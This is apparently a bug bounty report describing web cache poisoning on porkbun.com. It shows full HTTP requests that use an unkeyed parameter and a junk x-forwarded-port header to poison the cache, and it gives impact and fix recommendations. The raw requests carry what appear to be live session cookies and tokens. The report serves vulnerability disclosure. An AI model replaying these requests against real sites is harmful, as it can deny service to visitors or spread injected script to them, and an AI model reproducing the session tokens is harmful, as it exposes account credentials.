# porkbun-bug-bounty-report

I found the problem of cache poisoning in porkbun.com. A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.

Steps To Reproduce

Use x-forwarded-port to destroy the cache, repeat the request until porkbun.com appears in the response.


GET /?a0u1texhuy=1&utm_content=dq9i330jie HTTP/1.1

Host: porkbun.com

Accept-Encoding: gzip, deflate, br, a0u1texhuy

Accept: /, text/a0u1texhuy

Accept-Language: en-US,a0u1texhuy;q=0.9,en;q=0.8

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36 a0u1texhuy

Connection: close

Cache-Control: max-age=0

Origin: https://a0u1texhuy.porkbun.com

x-forwarded-port: zwrtxqvas9lm4kzkia

Cookie: _gcl_aw=GCL.1724153528.EAIaIQobChMI-OjSqryDiAMVy4xLBR3P4AxpEAMYASAAEgKq-PD_BwE; _gcl_gs=2.1.k1$i1724153526; _gcl_au=1.1.627762540.1724153528; _rdt_uuid=1724153529706.7697f77c-0b08-4e9d-9656-4250bb4ca58a; _uetsid=d665bec05ee711ef9442d5febf9ba8d5; _uetvid=d665eda05ee711ef92c69b8d2739c72c; _gid=GA1.2.1220392463.1724153531; _gac_UA-59154711-1=1.1724153531.EAIaIQobChMI-OjSqryDiAMVy4xLBR3P4AxpEAMYASAAEgKq-PD_BwE; _clck=71ho1w%7C2%7Cfoh%7C0%7C1693; BUNPRINT2=0a4af8764489c70abb72e6add738b269a637c69e70cf33422c45c044593adeb4; _clsk=i1182c%7C1724155306683%7C4%7C1%7Ch.clarity.ms%2Fcollect; __stripe_mid=51ac6f49-3b67-4bbe-ad7e-bcc3f210984b357ab2; BUNSESSION2=K5Z%2CXBbzPi7edvTn1dan2FGx-1UV7ytZi7WJ-MZPyLjIXwsy; aws-waf-token=157666fd-9bf9-4158-8263-0e0870c9a55d:FAoAuOZVZ1IVAAAA:X3fLNs7rJghEazguFIoNAsfAoLqiuRD9bnLUrlv+0hq5QKVJXFRn1kbg64WUEiPlm8bzGZTjdtYjoZ+hBQ+HXbOjLpLO4obO+vjRN3phOy3mdVINctAovzQX0ksQz7UhC/nzwDF3cKJjtZ3ZNJyRMDpINF1TikWBDpJ96fG4RdmtGogEUf/rrPjK2L0UdOHMix6pCyZed2MKf4GCzYWQZZr3DF/CsRmi2OdwE/rgxcKAmLLwaKGkJpZL; BUNSOURCE=0b3a2874f61d12ba97f272cb4c4c4046cbca49c1db07338d1cd7b3d3b5139220; cartId=bf5d6202e272f4202fe791ab1bdda57e51db34ad49ad227758715eaf5c09a848; _ga_YT848K9MDY=GS1.1.1724156228.2.0.1724156228.60.0.1821101490; _ga=GA1.1.2011873201.1724153528; csrf_pb=5081ec68c2d4d758f99ba3722ed793da; BUNPRINT=50c4cf0c37ec2ec84fee99711cf80e97; PPRB=eb2c68ce4d; PRB=72aed6ea0b; AWSALB=rxQoqrX6eLPexU5JQK25y9tDKI8X8zwgn1gt/pFTaRWcZJ6PIyGBScsA0px7IGAIIHR5xb5m6tvh3q/fiALCstV6DlKofuJ9QZmYjmYZKVpXq//M+u9VDFIalf3U; AWSALBCORS=rxQoqrX6eLPexU5JQK25y9tDKI8X8zwgn1gt/pFTaRWcZJ6PIyGBScsA0px7IGAIIHR5xb5m6tvh3q/fiALCstV6DlKofuJ9QZmYjmYZKVpXq//M+u9VDFIalf3U

2. Remove the parameters, x-forwarded-port, and origin in the request header. Then send the request, the cache has been polluted (due to the cache hit, it may take several more requests).




GET /?a0u1texhuy=1 HTTP/1.1

Host: porkbun.com

Accept-Encoding: gzip, deflate, br, a0u1texhuy

Accept: /, text/a0u1texhuy

Accept-Language: en-US,a0u1texhuy;q=0.9,en;q=0.8

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36 a0u1texhuy

Connection: close

Cache-Control: max-age=0

Origin: https://a0u1texhuy.porkbun.com

Cookie: _gcl_aw=GCL.1724153528.EAIaIQobChMI-OjSqryDiAMVy4xLBR3P4AxpEAMYASAAEgKq-PD_BwE; _gcl_gs=2.1.k1$i1724153526; _gcl_au=1.1.627762540.1724153528; _rdt_uuid=1724153529706.7697f77c-0b08-4e9d-9656-4250bb4ca58a; _uetsid=d665bec05ee711ef9442d5febf9ba8d5; _uetvid=d665eda05ee711ef92c69b8d2739c72c; _gid=GA1.2.1220392463.1724153531; _gac_UA-59154711-1=1.1724153531.EAIaIQobChMI-OjSqryDiAMVy4xLBR3P4AxpEAMYASAAEgKq-PD_BwE; _clck=71ho1w%7C2%7Cfoh%7C0%7C1693; BUNPRINT2=0a4af8764489c70abb72e6add738b269a637c69e70cf33422c45c044593adeb4; _clsk=i1182c%7C1724155306683%7C4%7C1%7Ch.clarity.ms%2Fcollect; __stripe_mid=51ac6f49-3b67-4bbe-ad7e-bcc3f210984b357ab2; BUNSESSION2=K5Z%2CXBbzPi7edvTn1dan2FGx-1UV7ytZi7WJ-MZPyLjIXwsy; aws-waf-token=157666fd-9bf9-4158-8263-0e0870c9a55d:FAoAuOZVZ1IVAAAA:X3fLNs7rJghEazguFIoNAsfAoLqiuRD9bnLUrlv+0hq5QKVJXFRn1kbg64WUEiPlm8bzGZTjdtYjoZ+hBQ+HXbOjLpLO4obO+vjRN3phOy3mdVINctAovzQX0ksQz7UhC/nzwDF3cKJjtZ3ZNJyRMDpINF1TikWBDpJ96fG4RdmtGogEUf/rrPjK2L0UdOHMix6pCyZed2MKf4GCzYWQZZr3DF/CsRmi2OdwE/rgxcKAmLLwaKGkJpZL; BUNSOURCE=0b3a2874f61d12ba97f272cb4c4c4046cbca49c1db07338d1cd7b3d3b5139220; cartId=bf5d6202e272f4202fe791ab1bdda57e51db34ad49ad227758715eaf5c09a848; _ga_YT848K9MDY=GS1.1.1724156228.2.0.1724156228.60.0.1821101490; _ga=GA1.1.2011873201.1724153528; csrf_pb=5081ec68c2d4d758f99ba3722ed793da; BUNPRINT=50c4cf0c37ec2ec84fee99711cf80e97; PPRB=eb2c68ce4d; PRB=72aed6ea0b; AWSALB=rxQoqrX6eLPexU5JQK25y9tDKI8X8zwgn1gt/pFTaRWcZJ6PIyGBScsA0px7IGAIIHR5xb5m6tvh3q/fiALCstV6DlKofuJ9QZmYjmYZKVpXq//M+u9VDFIalf3U; AWSALBCORS=rxQoqrX6eLPexU5JQK25y9tDKI8X8zwgn1gt/pFTaRWcZJ6PIyGBScsA0px7IGAIIHR5xb5m6tvh3q/fiALCstV6DlKofuJ9QZmYjmYZKVpXq//M+u9VDFIalf3U



3.Other users visit the https://porkbun.com/ page, and the result has been poisoned.



4.The currently discovered causes of cache poisoning:

url params (if there is reflected XSS on the server side, it will be very dangerous)

x-forwarded-port header
x-forwarded-url header

Recommendations
Cache poisoning is caused by different requests hitting the same cache. Remove these influencing factors, or only cache requests with unchanged results.

Impact

Launch a denial of service attack
If a page contains url parameters or request header reflection XSS, cache poisoning can easily spread the page containing malicious code to other people without the need to communicate with the victim
Issue detail

 The application uses a cache that does not include every query parameter in the cache key. This means the cache can be manipulated into saving responses that have been influenced by these parameters.

Burp set the following parameter in the request:

utm_content=dq9i330jie

This resulted in a response containing dq9i330jie. I then resent the request with a different parameter value and got the same response, indicating that it had been cached.



More ways to exploit:
https://portswigger.net/research/practical-web-cache-poisoning
https://portswigger.net/research/web-cache-entanglement
